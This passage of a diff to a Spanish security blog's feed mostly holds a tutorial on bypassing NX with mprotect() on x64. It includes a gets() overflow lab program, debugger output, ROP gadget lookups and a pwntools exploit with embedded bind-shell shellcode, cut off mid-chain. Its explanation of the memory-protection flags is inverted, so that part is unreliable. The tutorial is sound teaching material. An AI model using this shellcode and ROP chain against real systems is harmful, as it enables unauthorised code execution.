en el User-Agent.&lt;/p&gt;
 
 &lt;p&gt;Al ingresar a la web no podemos ver nada interesante a primera vista, tampoco al mostrar su codigo fuente, asi que nos decargaremos los archivos que nos proporciona HTB&lt;/p&gt;
 
@@ -2310,208 +2610,4 @@ MariaDB [information_schema]&amp;gt;
 
 &lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/UPDWP-SQLi/waifu.webp&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="SQL injection" /><category term="Union-Based SQL injection" /><category term="Blind-Based SQL injection" /><category term="Error-Based SQL injection" /><category term="Time-Based SQL injection" /><summary type="html">En esta seccion Un Poco De Web Pentesting mi intencion es explicar sin tanto tramite como explotar varias vulnerabilidades web tomando como ejemplo CTFs y laboratorios que me encuentro, ten en cuenta que este solo es un recurso mas de los que hay internet.</summary></entry><entry><title type="html">Bypass NX usando mprotect() en x64</title><link href="http://localhost:4000/bypassNX-mprotect/" rel="alternate" type="text/html" title="Bypass NX usando mprotect() en x64" /><published>2023-02-26T00:00:00-06:00</published><updated>2023-02-26T00:00:00-06:00</updated><id>http://localhost:4000/bypassNX-mprotect</id><content type="html" xml:base="http://localhost:4000/bypassNX-mprotect/">&lt;p&gt;En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2libc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2reg&lt;/code&gt;, mas que nada tecnicas que usen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP&lt;/code&gt;. Asi que ahora te voy a mostrar como usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mprotect()&lt;/code&gt; para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.&lt;/p&gt;
-
-&lt;h2 id=&quot;mprotect&quot;&gt;mprotect()&lt;/h2&gt;
-
-&lt;p&gt;Segun la man page de Linux &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mprotect&lt;/code&gt; es:&lt;/p&gt;
-
-&lt;p&gt;mprotect () cambia las protecciones de acceso para las páginas de memoria del proceso de llamada que contienen cualquier parte del rango de direcciones en el intervalo [addr, addr+len-1]. addr debe estar alineado con el límite de la página… En caso de éxito, mprotect () devuelve cero. En caso de error, esta llamada al sistema devuelve -1 y errno para indicar el error. se establece&lt;/p&gt;
-
-&lt;p&gt;Y aca mas entendible seria que mprotect es la funcion que establece los permisos de lectura y escritura a cierta area de memoria. Esta funcion toma 3 argumentos:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Una direccion inicial&lt;/li&gt;
-  &lt;li&gt;La longitud, que seria el rango en que podemos modificar&lt;/li&gt;
-  &lt;li&gt;Y una combinacion de banderas que son las que haran que se establezcan los permisos, estas banderas son:
-    &lt;ul&gt;
-      &lt;li&gt;&lt;strong&gt;PROT_READ&lt;/strong&gt;: La memoria no se puede leer&lt;/li&gt;
-      &lt;li&gt;&lt;strong&gt;PROT_WRITE&lt;/strong&gt;: La memoria no se puede modificar/escribir&lt;/li&gt;
-      &lt;li&gt;&lt;strong&gt;PROT_EXEC&lt;/strong&gt;: La memoria no se puede ejecutar o no es ejecutable&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;crafteando-el-exploit&quot;&gt;Crafteando el exploit&lt;/h2&gt;
-
-&lt;h3 id=&quot;codigo-vulnerable&quot;&gt;Codigo vulnerable&lt;/h3&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-
-    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;No hace falta hacer reversing por que la vulnerabilidad se encuentra en la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Como estamos en 64 bits los primero 6 argumentos se pasan los registros RDI, RSI, RDX, RCX, R8 y R9, y cualquier cosa despues se empieza a pasar por el stack.&lt;/p&gt;
-
-&lt;p&gt;En x64 para poder hacer esta tecnica ocupados de:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;La direccion base de libc&lt;/li&gt;
-  &lt;li&gt;Un gadget &lt;strong&gt;pop rdi&lt;/strong&gt;; ret: este funcionara para poner la direccion de la pila en rdi&lt;/li&gt;
-  &lt;li&gt;Un gadget &lt;strong&gt;pop rsi&lt;/strong&gt;; ret: esta funcionara para poner la longitud en rsi&lt;/li&gt;
-  &lt;li&gt;Un gadget &lt;strong&gt;pop rdx&lt;/strong&gt;; ret,: este funcionara para establecer el valor 0x7 en rdx, este valor es el de los permisos de lectura, escritura y ejecucion.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Algo asi se llamaria a la funcion mprotect:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#incluye &amp;lt;sys/mman.h&amp;gt; 
-&lt;/span&gt;
-       &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-                            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-                            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-                           &lt;span class=&quot;n&quot;&gt;RDI&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;RSI&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;RDX&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;sacando-la-direccion-de-libc&quot;&gt;Sacando la direccion de libc&lt;/h3&gt;
-
-&lt;p&gt;Dentro del debugger podemos ingresar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmmap libc&lt;/code&gt;, obviamente antes hay que ejecutar el binario. Podemos ver la direccion base de libc:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  vmmap libc
-[ Legend:  Code | Heap | Stack ]
-Start              End                Offset             Perm Path
-0x007ffff7db6000 0x007ffff7dd8000 0x00000000000000 r-- /usr/lib/libc.so.6
-0x007ffff7dd8000 0x007ffff7f32000 0x00000000022000 r-x /usr/lib/libc.so.6
-0x007ffff7f32000 0x007ffff7f8a000 0x0000000017c000 r-- /usr/lib/libc.so.6
-0x007ffff7f8a000 0x007ffff7f8e000 0x000000001d4000 r-- /usr/lib/libc.so.6
-0x007ffff7f8e000 0x007ffff7f90000 0x000000001d8000 rw- /usr/lib/libc.so.6
-gef➤ 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;La direccion que usare es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x007ffff7db6000&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;offset-del-rip&quot;&gt;Offset del RIP&lt;/h3&gt;
-
-&lt;p&gt;Como estamos en x64 podemos hacer uso del offset del RSP o del RBP y sumarle 8.&lt;/p&gt;
-
-&lt;p&gt;Como estoy usando GEF, ingresare el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern create 300&lt;/code&gt;, para generar 300 caracteres que le pasaremos como input. Una vez que el programa pete ingresare &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern offset $rbp&lt;/code&gt; para pasar el offset del RBP:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  pattern offset $rbp
-[+] Searching for &apos;$rbp&apos;
-[+] Found at offset 256 (little-endian search) likely
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Ahora le sumamos 8 y nos da 264 que seria el desplazamiento para llegar al RIP.&lt;/p&gt;
-
-&lt;p&gt;Hace rato les mencione que mprotect recibia un argumento que es la longitud, debido a que la cadena que le metimos esta desde la direccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x007fffffffe418&lt;/code&gt;, podemos usar una direccion anterior lo suficientemente grande. Regularmente la longitud que se le pasa a mprotect en estos casos es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1000&lt;/code&gt;, la cual podra ser desde la direccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffffffffe000&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x007fffffffe418│+0x0000: &quot;iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa&quot;	 ← aca estan
-0x007fffffffe420│+0x0008: &quot;jaaaaaabkaaaaaablaaaaaabmaaa&quot;
-0x007fffffffe428│+0x0010: &quot;kaaaaaablaaaaaabmaaa&quot;
-0x007fffffffe430│+0x0018: &quot;laaaaaabmaaa&quot;
-0x007fffffffe438│+0x0020: 0x007f006161616d (&quot;maaa&quot;?)
-0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  &quot;/home/c4rta/Downloads/mprotect&quot;
-0x007fffffffe448│+0x0030: 0xc91dfa2faf99b844
-0x007fffffffe450│+0x0038: 0x0000000000000000
-────────────────────────────────────────────
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Hasta ahora nuestro exploit va asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./mprotect&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;n/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;//bi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x89\xe3\x51\x53\x89\xe1\xb0\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x007ffff7db6000&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rip_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;264&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stack_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffffffffe000&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;direccion-de-mprotect&quot;&gt;Direccion de mprotect&lt;/h3&gt;
-
-&lt;p&gt;Dentro de gdb podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p mprotect&lt;/code&gt; y nos da esto:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  p mprotect
-$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x7ffff7eb62f0 &amp;lt;mprotect&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;direcciones-de-los-gadgets&quot;&gt;Direcciones de los gadgets&lt;/h3&gt;
-
-&lt;p&gt;En mi caso usare ROPGadget pero puden usar ropper o radare2, aqui les puedo decir que no me arrojo ningun gadget, eso no es problema cuando se nos proporciona la libreria que esta usando, en este caso como lo compile en mi maquina, uso la libreria que se encuentra en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/libc.so.6&lt;/code&gt;, asi que esa la podemos usar para sacar los gadgets con el comando:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROPgadget --binary /usr/lib/libc.so.6 | grep &quot;pop rdi&quot;&lt;/code&gt;: 0x0000000000023d35&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROPgadget --binary /usr/lib/libc.so.6 | grep &quot;pop rsi&quot;&lt;/code&gt;: 0x0000000000025641&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROPgadget --binary /usr/lib/libc.so.6 | grep &quot;pop rdx&quot;&lt;/code&gt;: 0x000000000004e062&lt;/p&gt;
-
-&lt;h3 id=&quot;ejecutando-el-exploit-final&quot;&gt;Ejecutando el exploit final&lt;/h3&gt;
-
-&lt;p&gt;Despues de agregar lo que le falta tenemos este exploit:&lt;/p&gt;
-
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./mprotect&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;n/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;//bi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x89\xe3\x51\x53\x89\xe1\xb0\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x007ffff7db6000&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;rip_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;264&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stack_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffffffffe000&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;mprotect_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffff7eb62f0&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000023d35&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pop_rsi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000025641&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pop_rdx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000004e062&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;264&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
